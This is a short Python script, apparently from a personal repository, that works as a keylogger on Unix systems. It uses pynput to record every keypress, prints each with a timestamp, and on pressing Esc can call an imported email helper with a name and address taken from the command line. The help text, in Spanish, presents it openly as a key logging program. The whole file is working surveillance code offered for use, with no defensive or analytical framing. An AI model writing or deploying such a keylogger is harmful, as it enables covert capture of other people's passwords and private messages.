from pynput import keyboard

import sys
sys.path.append('../')

from utils.time import LogDate
from utils.email import SendEmail
from utils.constans import Common


SEND_EMAIL = sys.argv[1] == '-e'
HELP_FLAG = sys.argv[1] == '-h'

def on_press(key):
    if str(key) == 'Key.esc': # You need to remove this if you don't need to stop the script
        if SEND_EMAIL and SendEmail.validate_list(sys.argv): 
            SendEmail(sys.argv[2], sys.argv[3])
        else:
            print(Common.ERROR_EMAIL_MESSAGE)
        sys.exit()
    else:
        print(f'{LogDate().Year()} | {LogDate().Hour()} {key}')

if HELP_FLAG:
    print(
        """Programa para realizar key logger en un sistema unix (no compatible con windows)
        Opciones:
        -h: Muestra las opciones del script
        -e [nombre] [email]: Envia un email al email especificado

        Author: eacarras""")
    sys.exit()
else:
    with keyboard.Listener(
        on_press=on_press) as key_listener:
        key_listener.join()
